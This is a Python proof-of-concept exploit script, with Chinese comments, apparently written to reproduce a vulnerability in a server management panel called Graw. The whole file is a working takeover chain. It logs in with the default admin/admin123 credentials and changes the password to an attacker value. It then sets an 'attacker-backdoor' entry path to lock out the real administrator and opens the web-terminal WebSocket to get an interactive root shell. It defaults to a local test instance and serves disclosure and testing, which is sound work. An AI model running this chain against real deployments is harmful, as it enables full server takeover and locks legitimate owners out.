#!/usr/bin/env python3
"""PoC-7: 攻击链 A —— 新装环境默认凭据接管 → root shell（严重）。

前置条件（模拟真实新装环境）：
  - 全新 data/ 目录启动的 Graw 实例（默认口令 admin/admin123 待改密、
    ShunX 安全入口未配置），且暴露在攻击者可达网络。

复现步骤：
  1. cd backend && rm -rf data （或用全新目录）
  2. python3 -m uvicorn app.main:app --host 127.0.0.1 --port 8001
  3. python3 poc7_chain_a_takeover.py   （默认打 127.0.0.1:8001）

危害：无需任何先验知识即可完整接管面板并获得交互式 root shell；
     生产 Docker（privileged + /host）形态下等同宿主机 root RCE。
"""
import asyncio
import json
import sys
import urllib.request
import urllib.error

BASE = "http://127.0.0.1:8001"
WS_BASE = "ws://127.0.0.1:8001"
ATTACKER_PW = "AttackerOwn2026"
ATTACKER_ENTRY = "attacker-backdoor"


def req(method, path, body=None, headers=None):
    h = dict(headers or {})
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        h.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read() or b"{}")
        except Exception:
            return e.code, {}


def step0_recon():
    print("[*] 步骤 0：侦察 —— 新装环境 ShunX 状态")
    st, body = req("GET", "/api/shunx/status?path=x")
    print(f"    -> HTTP {st} {body}")
    assert body.get("enabled") is False, "目标不是新装环境（ShunX 已配置），攻击链 A 不适用"


def step1_default_login():
    print("[*] 步骤 1：公开文档中的默认口令 admin/admin123 登录")
    st, body = req("POST", "/api/auth/login",
                   {"username": "admin", "password": "admin123"})
    print(f"    -> HTTP {st} token={'YES' if body.get('token') else 'NO'}")
    tok = body.get("token", "")
    assert tok, f"默认凭据登录失败: {body}"
    return tok


def step2_takeover(tok):
    print("[*] 步骤 2：改密接管账号（POST /api/auth/password 仅需登录态）")
    st, body = req("POST", "/api/auth/password",
                   {"old_password": "admin123", "new_password": ATTACKER_PW},
                   {"Authorization": "Bearer " + tok})
    print(f"    -> HTTP {st}")
    tok2 = body.get("token", "")
    assert tok2, f"改密失败: {body}"
    st, me = req("GET", "/api/auth/me", headers={"Authorization": "Bearer " + tok2})
    print(f"    -> /me: HTTP {st} role={me.get('role')} perms={me.get('perms')}")
    return tok2


def step3_lockout(tok2):
    print("[*] 步骤 3：自设安全入口，把真管理员锁在门外")
    st, body = req("PUT", "/api/shunx/config",
                   {"entry_path": ATTACKER_ENTRY, "enabled": True},
                   {"Authorization": "Bearer " + tok2})
    print(f"    -> HTTP {st} {body.get('ok')}")


async def step4_shell(tok2):
    print("[*] 步骤 4：经 Web 终端 WebSocket 获取交互式 root shell")
    import websockets
    uri = WS_BASE + "/api/terminal/ws?token=" + tok2
    async with websockets.connect(uri, max_size=2**22) as ws:
        await asyncio.sleep(1.5)
        for cmd in ["id", "whoami", "hostname", "echo PWNED-$(date +%s)"]:
            await ws.send(cmd + "\n")
            await asyncio.sleep(0.8)
        out = ""
        try:
            while True:
                msg = await asyncio.wait_for(ws.recv(), timeout=2.0)
                out += msg if isinstance(msg, str) else msg.decode(errors="replace")
        except asyncio.TimeoutError:
            pass
        print("    --- 终端输出 ---")
        for line in out.splitlines():
            if line.strip():
                print("      " + line[:140])
        return out


def main():
    step0_recon()
    tok = step1_default_login()
    tok2 = step2_takeover(tok)
    step3_lockout(tok2)
    out = asyncio.run(step4_shell(tok2))
    pwned = "PWNED-" in out and "uid=0(root)" in out
    print(f"\n[{'!' if pwned else ' '}] 结果：{'已获取 root shell' if pwned else '未成功'}")
    sys.exit(0 if pwned else 1)


if __name__ == "__main__":
    main()
